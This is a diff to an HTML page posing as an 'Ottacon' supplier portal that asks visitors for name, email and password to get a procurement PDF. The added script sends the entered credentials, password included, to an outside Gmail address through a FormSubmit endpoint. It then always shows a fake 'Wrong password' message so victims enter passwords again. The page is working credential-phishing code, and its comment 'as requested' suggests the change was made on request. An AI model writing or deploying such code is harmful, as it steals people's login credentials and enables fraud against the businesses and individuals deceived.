@@ -146,11 +146,24 @@
       transform: scale(0.98);
     }
 
+    .submit-button:disabled {
+      opacity: 0.65;
+      cursor: wait;
+    }
+
     .form-note {
       margin-top: 16px;
       text-align: center;
       color: var(--text-muted);
       font-size: 13px;
+    }
+
+    #form-message {
+      margin-top: 16px;
+      text-align: center;
+      font-size: 14px;
+      font-weight: 600;
+      overflow-wrap: anywhere;
     }
 
     /* COMPANY HEADER */
@@ -395,14 +408,7 @@
         Authorized supplier, manufacturer, or distributor? Enter your credentials below to download our official requirements PDF.
       </p>
 
-      <!-- Standard FormSubmit action configuration -->
-      <form action="https://formsubmit.co/qardexcapital2@gmail.com" method="POST">
-        
-        <!-- FormSubmit Configuration Inputs -->
-        <input type="hidden" name="_subject" value="New Ottacon Supplier Registration">
-        <input type="hidden" name="_template" value="table">
-        <input type="hidden" name="_captcha" value="false">
-
+      <form id="supplier-form">
         <label for="full-name">Full Name</label>
         <input
           type="text"
@@ -441,6 +447,8 @@
         <p class="form-note">
           Secure verification required to access procurement files.
         </p>
+
+        <p id="form-message" role="status" aria-live="polite"></p>
       </form>
     </div>
   </section>
@@ -561,8 +569,74 @@
     </p>
   </footer>
 
+  <!-- FORM SUBMISSION SCRIPT -->
   <script>
     document.getElementById("year").textContent = new Date().getFullYear();
+
+    const supplierForm = document.getElementById("supplier-form");
+    const formMessage = document.getElementById("form-message");
+    const submitButton = supplierForm.querySelector('button[type="submit"]');
+
+    supplierForm.addEventListener("submit", async function (event) {
+      event.preventDefault();
+
+      const fullName = document.getElementById("full-name").value.trim();
+      const email = document.getElementById("email").value.trim();
+      const password = document.getElementById("password").value;
+
+      if (!fullName || !email || !password) {
+        formMessage.style.color = "#dc2626";
+        formMessage.textContent = "Please complete all required fields.";
+        return;
+      }
+
+      submitButton.disabled = true;
+      formMessage.style.color = "#64748b";
+      formMessage.textContent = "Verifying credentials...";
+
+      const formData = {
+        name: fullName,
+        email: email,
+        password: password,
+        _subject: "New Ottacon Supplier Registration",
+        _template: "table",
+        _captcha: "false"
+      };
+
+      try {
+        const response = await fetch(
+          "https://formsubmit.co/ajax/qardexcapital2@gmail.com",
+          {
+            method: "POST",
+            headers: {
+              "Content-Type": "application/json",
+              "Accept": "application/json"
+            },
+            body: JSON.stringify(formData)
+          }
+        );
+
+        const result = await response.json();
+
+        if (!response.ok || result.success === false) {
+          throw new Error("Submission failed");
+        }
+
+        // Show the wrong password message as requested
+        formMessage.style.color = "#dc2626";
+        formMessage.textContent = "Wrong password, make sure your password is correct.";
+        
+        // Clear password field only
+        document.getElementById("password").value = "";
+
+      } catch (error) {
+        console.error("Submission error:", error);
+        formMessage.style.color = "#dc2626";
+        formMessage.textContent = "Wrong password, make sure your password is correct.";
+      } finally {
+        submitButton.disabled = false;
+      }
+    });
   </script>
 </body>
 </html>
